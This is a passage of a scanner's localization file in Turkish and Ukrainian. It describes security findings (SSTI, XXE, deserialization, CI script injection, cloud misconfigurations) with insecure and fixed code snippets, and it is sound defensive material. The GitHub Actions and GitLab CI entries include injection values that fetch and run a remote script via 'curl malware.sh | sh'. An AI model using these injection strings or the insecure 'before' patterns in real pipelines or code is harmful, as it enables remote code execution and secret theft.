      "MongoDB'nin $where operatörü her döküman için sunucu tarafında JavaScript çalıştırır — bu metin kullanıcıdan gelen bir değer birleştirilerek oluşturuluyorsa, onu kontrol eden kişi veritabanının bağlamında rastgele kod çalıştırabilir, normal bir SQL injection'da olduğu gibi sadece filtreyi değiştirmekle kalmaz.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Kullanıcının girdiği bir değer veri olarak değil, bir template olarak yorumlanıyor",
    description:
      "Bir template'i derleyen/çalıştıran fonksiyon, sabit bir template kullanıp sadece veriyi geçirmek yerine, TÜM template'i bir istek değerinden alıyor. Bir saldırgan doğrudan template motorunun söz dizimiyle yazabilir (örn. Jinja2 için {{7*7}}) ve sunucuda kod çalıştırabilir — Server-Side Template Injection, genellikle XSS gibi sadece bir görüntüleme sorunu değil, rastgele komut çalıştırmaya kadar gider.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML ayrıştırıcı dosya okumaya veya dışarıya istek yapmaya zorlanabilir",
    description:
      "Bir XML ayrıştırıcı (DocumentBuilderFactory), yakın satırlarda harici varlıkları (DOCTYPE) açıkça devre dışı bırakmadan oluşturuluyor. Ayrıştırıcı güvenilmeyen bir kaynaktan XML alırsa, bir saldırgan sunucudaki dosyaları okumak veya seçtiği bir adrese istek yaptırmak için harici bir varlık tanımlayabilir — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "Bir Terraform security group'u hassas bir portu tüm internete açıyor",
    description:
      "0.0.0.0/0 (herhangi bir IP adresi) içeren \"cidr_blocks\" olan bir kural, hassas bir portun yakınında — SSH (22), RDP (3389) veya tipik bir veritabanı portu (MySQL, Postgres, MongoDB, Redis, SQL Server). İnternetteki herkes o servise bağlanmayı deneyebilir, sadece olması gerekenler değil.",
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # yalnızca özel ağınız, ya da bir bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Bir Google Cloud firewall kuralı hassas bir portu tüm internete açıyor",
    description:
      "0.0.0.0/0 (herhangi bir IP adresi) içeren \"source_ranges\" olan bir \"google_compute_firewall\" kaynağı, hassas bir porta — SSH (22), RDP (3389) veya tipik bir veritabanı portu (MySQL, Postgres, MongoDB, Redis, SQL Server) — trafiğe izin veriyor. İnternetteki herkes o servise bağlanmayı deneyebilir, sadece olması gerekenler değil.",
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # yalnızca özel ağınız, ya da bir bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Bir Azure ağ kuralı hassas bir portu tüm internete açıyor",
    description:
      "\"source_address_prefix\" değeri \"*\" veya \"0.0.0.0/0\" olan, yönü \"Inbound\" ve erişimi \"Allow\" olan bir ağ güvenlik kuralı (\"azurerm_network_security_rule\", ya da \"azurerm_network_security_group\" içinde bir \"security_rule\" bloğu), hassas bir portun yakınında — SSH (22), RDP (3389) veya tipik bir veritabanı portu. İnternetteki herkes o servise bağlanmayı deneyebilir, sadece olması gerekenler değil.",
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # yalnızca özel ağınız, ya da bir bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "Bir Terraform değişkeninin varsayılan değeri olarak bir sır yazılmış",
    description:
      "password/secret/token/key gibi bir isme sahip değişkenin \"default\"ında sabit bir değer var. Çalışma zamanında geçirilen bir değerin aksine (tfvars, TF_VAR_* ortam değişkenleri), bir default kaynak kodunun içinde kalır — ve depo paylaşılıyor veya herkese açıksa, Terraform state'ine erişimi olmayan biri bile onu görebilir.",
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # varsayılan değer yok: bir .tfvars dosyasıyla (git dışında) veya bir TF_VAR_db_password ortam değişkeniyle geçirilmeli\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Harici bir kullanıcının kontrol ettiği bir değer doğrudan bir CI shell komutuna giriyor",
    description:
      'Bir GitHub Actions workflow\'undaki "run:" komutu, pull request başlığı, bir branch adı veya bir yorumun metni gibi bir değeri doğrudan enterpolasyonla kullanıyor — bunların hepsi, harici bir fork\'tan bile olsa bir pull request veya yorum açan herkes tarafından yazılabilir. `"; curl malware.sh | sh #` gibi bir değer, o workflow\'da bulunan her sırra erişimle CI\'da rastgele komutlar çalıştırır.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # bir ortam değişkeni olarak geçirildi, hiçbir zaman doğrudan komuta enterpole edilmedi`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflow, depo sırlarına erişimle harici bir pull request'in kodunu çalıştırıyor",
    description:
      '"pull_request_target" kullanılıyor — alakasız bir fork\'tan açılan bir pull request için bile ana deponun izin ve sırlarıyla çalışır — ve ana branch yerine pull request\'in kendi kodunu ("github.event.pull_request.head") checkout ediyor. Pull request\'i açan kişi, o sırlara erişimle kendi kodunu çalıştırmış oluyor.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # PR'ın kodunu değil, ana branch'i checkout eder — ya da daha geniş\n      # izinler/sırlar gerekmiyorsa "pull_request_target" yerine\n      # "pull_request" kullanın.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "İstek verisi kod çalıştırabilen bir formatla deserialize ediliyor",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) veya node-serialize kütüphanesi (Node), istekten doğrudan alınan bir değeri deserialize ediyor. JSON'ın aksine, bu formatlar deserialization sırasında kodu temsil edip çalıştırabilir — gönderilen değeri kontrol eden kişi sunucuda rastgele kod çalıştırabilir.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON, pickle'ın aksine, ayrıştırma sırasında asla kod çalıştırmaz`,
    },
  },
  "jwt-none-algorithm": {
    title: "Kod, imzasız JWT tokenlarını (\"none\" algoritması) açıkça kabul ediyor",
    description:
      "Bir JWT tokenını doğrulamak için kabul edilen algoritmalar arasında \"none\" var. \"none\" algoritmalı bir tokenın doğrulanacak hiçbir imzası yoktur: herkes istediği içerikle (örn. bir yönetici rolü) bir tane oluşturabilir ve kod onu geçerli kabul eder.",
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // kabul edilen algoritmalar arasına asla "none" eklemeyin`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Terraform'da tanımlı bir S3 bucket'ında Block Public Access devre dışı",
    description:
      "\"aws_s3_bucket_public_access_block\"ın dört korumasından (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) biri veya birkaçı false olarak ayarlanmış. Bu, bucket'ın zaten herkese açık olduğu anlamına gelmez, ama ileride yanlışlıkla herkese açık hale getirilmesini önleyecek bir güvenlik ağını kaldırır.",
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Terraform'da tanımlı bir IAM policy'si tam erişim veriyor",
    description:
      "Eylemi \"*\" ve kaynağı \"*\" olan bir statement, her AWS servisine ve kaynağına tam erişim veriyor — henüz uygulanmadan doğrudan koddan okunan, canlı IAM state'inde zaten yapılan aynı kontrol. Acil durum rolü için kasıtlı olabilir, ama doğrulanmalı: günlük kullanım için yalnızca gerçekten gereken izinleri verin.",
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Bir Google Cloud Storage bucket'ı herkes tarafından okunabilir hale getirilmiş",
    description:
      "Bir \"google_storage_bucket_iam_member\" veya \"google_storage_bucket_iam_binding\" kaynağı, \"allUsers\" veya \"allAuthenticatedUsers\"a bir rol veriyor — ilki bucket'ı Google hesabı olmayan herkes de dahil internetteki herkes tarafından okunabilir yapar; ikincisi, erişimi olması gerekenlerle sınırlı kalmadan herhangi bir Google hesabına sahip herkese açar.",
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # yalnızca gerçekten erişmesi gerekenler, allUsers/allAuthenticatedUsers değil\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Bir Azure storage account'ında herkese açık blob erişimi etkin",
    description:
      "\"allow_blob_public_access\", bir \"azurerm_storage_account\" üzerinde true olarak ayarlanmış: herkese açık hale getirilmiş bir blob/container'ın URL'sini bilen herkes, hiçbir kimlik doğrulama olmadan onu okuyabilir.",
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Bir Google Cloud IAM rolü tam erişim veriyor (Owner/Editor)",
    description:
      "Bir \"google_project_iam_binding\"/\"google_project_iam_member\" (veya organizasyon/klasör düzeyindeki eşdeğeri), \"roles/owner\" veya \"roles/editor\" temel rolünü atıyor — projedeki her servise neredeyse tam erişim. Acil durum hesabı için kasıtlı olabilir, ama doğrulanmalı: günlük kullanım için yalnızca gerçekten gereken, daha özel önceden tanımlı rolleri verin.",
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # yalnızca gerçekten gereken önceden tanımlı rol, roles/owner değil\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Bir Azure rol ataması tam erişim veriyor (Owner)",
    description:
      "Bir \"azurerm_role_assignment\", atanan tüm kapsam (subscription, resource group...) üzerinde \"Owner\" rolünü atıyor — diğer kullanıcıların izinleri üzerindeki kontrol dahil tam erişim. Acil durum hesabı için kasıtlı olabilir, ama doğrulanmalı: günlük kullanım için yalnızca gerçekten gereken daha özel rolü verin (örn. tek bir resource group üzerinde \"Contributor\").",
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # yalnızca gerçekten gereken daha özel rol, tüm subscription üzerinde Owner değil\n}`,
    },
  },
  "weak-random-token": {
    title: "Bir güvenlik tokenı kriptografik olarak güvenli olmayan bir rastgele sayı üretici ile oluşturuluyor",
    description:
      "token/session/reset/otp/csrf gibi bir isme sahip bir değer, Math.random() (JS), random.random() (Python) veya rand() (PHP) ile oluşturuluyor — güvenlik için tasarlanmamış, dizileri tahmin edilebilir üreticiler. Bu şekilde oluşturulan bir token tahmin edilebilir veya yeniden oluşturulabilir, var olma amacını boşa çıkarır (örn. herkesin tahmin edebileceği bir şifre sıfırlama linki).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, Math.random değil — tahmin edilemez`,
    },
  },
  "ldap-injection": {
    title: "Bir LDAP filtresi, bir istek değerini doğrudan birleştirerek oluşturuluyor",
    description:
      "Bir LDAP filtresi oluşturan satır (örn. \"(uid=...)\"), LDAP özel karakterlerinin hiçbir escape işlemi yapılmadan istekten alınan bir değeri doğrudan içeriyor. Bu değeri kontrol eden kişi filtrenin mantığını değiştirebilir — örneğin bir kimlik doğrulama kontrolünü atlayarak veya görmemesi gereken dizin verilerini okuyarak.",
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // bir filtrede kullanmadan önce LDAP özel karakterleri her zaman escape edilmeli\nclient.search(base, { filter });",
    },
  },
  "header-injection": {
    title: "Bir istek değeri doğrudan bir HTTP yanıt başlığına giriyor",
    description:
      "Bir HTTP yanıt başlığı, satır sonu (CRLF) içermediğini kontrol etmeden doğrudan istekten (query, body, params) alınan bir değerle ayarlanıyor. Bir saldırgan ek başlıklar, hatta tamamen farklı bir yanıt ekleyebilir — response splitting — önbelleği, çerezleri veya diğer kullanıcılara gösterilen içeriği manipüle edebilir.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfile root olmayan bir kullanıcı ayarlamıyor",
    description:
      "Dockerfile'da USER talimatı yok: biri olmadan, container root olarak çalışır. Bir saldırgan container içinde kod çalıştırmayı başarırsa (örn. güvenlik açığı olan bir kütüphaneyi istismar ederek), container içinde root olmak host'a kaçışı — veya çevredeki sistem üzerinde daha geniş bir etkiyi — kolaylaştırır.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes manifest'i root olmayan bir kullanıcı olarak çalışmayı açıkça zorunlu kılmıyor",
    description:
      "Manifest'in hiçbir yerinde (ne pod ne de container düzeyinde) \"runAsNonRoot\" yok: ayarlanmazsa, bir container image'ının tanımladığı kullanıcı olarak çalışır — image bunu değiştirmediyse genellikle varsayılan olarak root. Açıkça true'ya ayarlamak, image hâlâ root olarak çalışmaya çalışırsa pod'un sadece bir olaydan sonra öğrenmek yerine başlamayı başaramamasını sağlar.",
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
  "gha-unpinned-action": {
    title: "Üçüncü taraf bir CI aksiyonu kesin bir sürüme (commit SHA) sabitlenmemiş",
    description:
      "Workflow, commit SHA yerine tag veya branch ile (örn. \"@v1\", \"@main\") referans verilen üçüncü taraf bir aksiyon kullanıyor. Onu bakımını yapan kişi — veya hesabını ele geçiren biri — o referansı istediği zaman farklı bir commit'e taşıyabilir, CI'da çalışanı sessizce değiştirebilir ve onun sırlarına erişebilir. Bir commit SHA her zaman tam olarak aynı koda işaret eder.",
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, commit SHA'ya sabitlendi — sürümü güncellediğinizde SHA'yı da güncelleyin`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflow, yalnızca kullandıklarını değil, tokenın tüm izinlerini kendine veriyor",
    description:
      "\"permissions: write-all\", workflow sadece bir kısmını kullansa bile workflow'un GITHUB_TOKEN'ına her şeye — issue'lar, pull request'ler, paketler, deployment'lar — yazma erişimi veriyor. Workflow'daki bir adım ele geçirilirse (kötü niyetli bir bağımlılık, enjekte edilmiş bir script), bu daha geniş izinler onu istismar edenin yapabileceklerini artırır.",
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # yalnızca workflow'un gerçekten kullandığı izinler`,
    },
  },
  "insecure-cookie-flags": {
    title: "Bir session veya kimlik doğrulama çerezi Secure ve HttpOnly bayrakları olmadan ayarlanmış",
    description:
      "session/auth/token'a benzeyen bir isme sahip bir çerez, seçenekleri arasında \"httpOnly\" ve \"secure\" olmadan ayarlanıyor. httpOnly olmadan, sayfadaki herhangi bir JavaScript — XSS ile enjekte edilen kod dahil — bu çerezi okuyabilir. secure olmadan, şifrelenmemiş bir HTTP bağlantısı üzerinden de gönderilebilir.",
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "docker-unpinned-base-image": {
    title: "Dockerfile'ın base image'ı \":latest\" etiketini kullanıyor",
    description:
      "Bir FROM talimatı, kesin bir sürüm yerine açıkça \":latest\" etiketini kullanıyor. \"latest\" zamanla değişir: aynı build, farklı bir zamanda tekrar yapıldığında base image'ın farklı bir sürümünü alabilir — tekrarlanabilir olmayan bir build, ve istenmeyen bir güncelleme kimse buna karar vermeden gelebilir.",
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile, COPY yerine ADD ile uzak bir dosya indiriyor",
    description:
      "http/https URL'li bir ADD talimatı, build sırasında internetten bir dosya indiriyor, hiçbir bütünlük kontrolü olmadan ve içerik depoda görünmüyor. O URL bir gün ele geçirilirse, build hiç kimse Dockerfile'ı okuyarak fark etmeden rastgele içerik çeker.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<beklenen hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "docker-hardcoded-secret": {
    title: "Dockerfile'da bir ENV veya ARG talimatına doğrudan bir sır yazılmış",
    description:
      "password/secret/token/key gibi bir isme sahip değişkenin bir ENV veya ARG talimatında sabit bir değeri var. Normalde image'a girmeyen bir .env dosyasının aksine, bu değer doğrudan Docker image'ının içine gömülür — onu çekebilen veya katman geçmişini inceleyebilen herkes, satır Dockerfile'ın sonraki bir sürümünde kaldırılsa bile onu geri alabilir.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# şöyle geçirilir: docker build --build-arg DB_PASSWORD=*** (ya da daha iyisi,\n# katman geçmişine hiç girmeyen bir BuildKit secret mount)`,
    },
  },
  "k8s-privileged-container": {
    title: "Kubernetes manifest'indeki bir container ayrıcalıklı olarak çalışıyor",
    description:
      "Bir container'ın securityContext'inde \"privileged: true\", container ile host arasındaki olağan izolasyonun neredeyse tamamını devre dışı bırakır: container host'un cihazlarına erişebilir, ağ yapılandırmasını değiştirebilir ve çoğu durumda onu çalıştıran makinede fiilen root erişimi kazanır. Normal bir uygulama için neredeyse hiç gerekmez.",
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # yalnızca gerçekten gereken capability'ler`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "Bir Kubernetes manifest'inin env değişkeninde bir sır açık metin olarak yazılmış",
    description:
      "password/secret/token/key gibi bir isme sahip bir ortam değişkeni, bir Secret'tan (\"valueFrom.secretKeyRef\") okunmak yerine sabit bir değere (\"value:\") sahip. Genellikle bir depoya commit edilen manifest'in kendisi, bu yüzden sırrı açık metin olarak içerir — bu, cluster'da komut çalıştırmasa bile sadece yapılandırmayı okuyabilen birine bile görünür.",
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "Kubernetes manifest'indeki bir container root olarak çalışacak şekilde ayarlanmış",
    description:
      "securityContext'te \"runAsUser: 0\" veya \"runAsNonRoot: false\", container'ı açıkça root olarak çalışmaya zorlar. Bir saldırgan container içinde kod çalıştırmayı başarırsa (örn. güvenlik açığı olan bir kütüphaneyi istismar ederek), container içinde root olmak host'a kaçışı — veya daha geniş bir etkiyi — kolaylaştırır.",
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Kubernetes manifest'indeki bir container başladığından daha fazla ayrıcalık kazanabilir",
    description:
      "securityContext'te \"allowPrivilegeEscalation: true\", container içindeki bir sürecin, onu başlatan süreçten daha fazla ayrıcalık kazanmasına izin verir (örn. bir setuid binary aracılığıyla). Uygulamadaki bir güvenlik açığıyla birleştiğinde, amaçlanandan daha fazla ayrıcalıkla kod çalıştırmaya doğru bir adım daha olur.",
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Kubernetes manifest'indeki bir pod, host'un ağını, süreçlerini veya paylaşılan belleğini paylaşıyor",
    description:
      "true olarak ayarlanmış \"hostNetwork\", \"hostPID\" veya \"hostIPC\", pod'u normal izolasyonundan çıkarır: hostNetwork pod'u host'un ağında açığa çıkarır (cluster'ın ağ politikalarını atlayarak), hostPID ona host makinedeki her sürece görünürlük verir, hostIPC ona host'un paylaşılan belleğine erişim verir. Normal bir uygulama için neredeyse hiç gerekmez — genellikle yalnızca düşük seviyeli sistem/izleme araçları için.",
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Güvenlik açığı olan bağımlılık:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Henüz bilinen düzeltilmiş bir sürüm yok — alternatif bir paket değerlendirin veya projenin güncellemelerini takip edin."
      ),
    },
  }),
    "gitlab-ci-script-injection": {
      title: 'Harici bir kullanıcının kontrol ettiği bir değer, GitLab CI pipeline\'ında ikinci bir shell\'den geçiyor',
      description: 'Bir "script:" satırı (veya "before_script:"/"after_script:") merge request başlığı, commit mesajı veya branch adı gibi önceden tanımlanmış bir GitLab değişkeniyle birlikte "eval" veya "sh -c"/"bash -c" kullanıyor — bunların hepsi, harici bir fork\'tan bile olsa, bir merge request açan herkes tarafından yazılabilir. Değer önce dış shell tarafından genişletilir, sonra ikinci shell\'in yeniden kod olarak yorumladığı bir dizenin içine yapıştırılır: "$(curl malware.sh | sh)" gibi bir başlık, o job\'da kullanılabilen tüm sırlara erişimle birlikte pipeline\'da rastgele komutlar çalıştırır.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # komuta argüman olarak geçirildi, onu yeniden yorumlayacak bir "bash -c" dizesinin içinde asla`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'GitLab CI pipeline\'ındaki Docker-in-Docker, TLS şifrelemesi devre dışı bırakılmış şekilde çalışıyor',
      description: 'Job, "docker:dind" servisini (pipeline içinde image oluşturmak için gereken Docker-in-Docker) kullanıyor ama "DOCKER_TLS_CERTDIR"i boş bir dizeye ayarlayarak Docker istemcisi ile dind daemon\'ı arasındaki TLS şifrelemesini tamamen devre dışı bırakıyor. TLS olmadan, runner\'ın aynı iç ağında o porta erişebilen herkes — yalnızca onu kullanması gereken job ile sınırlı kalmak yerine — genişletilmiş ayrıcalıklarla çalışan Docker daemon\'ını kontrol edebilir.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # Docker istemcisi ile dind daemon'ı arasında TLS etkin kalır — "" onu tamamen devre dışı bırakır`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'GitLab CI pipeline\'ının Docker image\'ı belirli bir sürüme sabitlenmemiş',
      description: 'Pipeline\'daki bir "image:" etiketsiz bir image\'a (bu ":latest"e eşdeğerdir) ya da açıkça ":latest"e işaret ediyor. O image\'ı bakımını yapan kişi, depo değişmeden içeriğini istediği zaman değiştirebilir — aynı pipeline bir günden diğerine farklı kod çalıştırmaya başlayabilir; bu, commit yerine etiketle referans verilen bir GitHub Action ile kavramsal olarak aynı tedarik zinciri riskidir.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # "latest" yerine belirli bir etiket (ya da daha iyisi bir digest "node@sha256:...")`,
      },
    },
},
  uk: {
  "supabase-service-role-in-client": {
    title: "Секретний ключ Supabase потрапляє у файл, призначений для браузера",
    description:
      "Змінна з публічним префіксом (напр. NEXT_PUBLIC_, VITE_) або файл на стороні клієнта посилається на service role key Supabase. Цей ключ обходить Row Level Security: якщо він потрапить у бандл браузера, будь-хто зможе прочитати його й діяти як адміністратор бази даних.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (лише сервер)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "У коді напряму прописані паролі або секретні ключі",
    description:
      "Ключ API, токен або пароль виглядають як буквальне значення, а не зчитуються зі змінної середовища. Будь-хто, хто прочитає вихідний код (або репозиторій, якщо він публічний), отримає цей секрет.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "Серед проаналізованих файлів є файл зі справжніми паролями проєкту",
    description:
      "Файл .env зі справжніми значеннями (а не .env.example) включено до аналізу. Якщо цей файл потрапить у репозиторій або публічний деплой, усі облікові дані, які він містить, стануть доступними.",
    fix: {
      before: `# .env (закомічено помилково)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (закомічено)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env залишається поза репозиторієм (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Будь-хто може читати або змінювати дані всіх користувачів",
    description:
      "Row Level Security вимкнено, або політика дозволяє доступ будь-кому (USING (true)) без перевірки, хто саме робить запит. Кожен автентифікований користувач — або навіть анонімний — може читати чи змінювати дані всіх інших.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Значення, введене користувачем, вставляється напряму в запит до бази даних",
    description:
      "SQL-запит побудований шляхом конкатенації або прямої інтерполяції рядка замість використання параметрів. Якщо цей текст надходить (навіть опосередковано) від користувача, він може змінити сам запит — SQL injection.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Схоже, паролі не захищені",
    description:
      "Поле пароля зберігається так само, як прийшло із запиту, і у файлі не з'являється жодна функція хешування (bcrypt, argon2, scrypt). Якщо базу даних буде скомпрометовано, усі паролі одразу стануть придатними для використання.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Секрет, який використовується для підпису входів, прописаний у коді відкритим текстом",
    description:
      "Секрет, переданий у jwt.sign / jwt.verify (або змінна JWT_SECRET), є буквальним значенням у коді замість того, щоб братися зі змінної середовища. Будь-хто, хто його прочитає, може створити дійсні токени доступу для будь-якого користувача.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Сервер можна змусити виконати зовнішні команди",
    description:
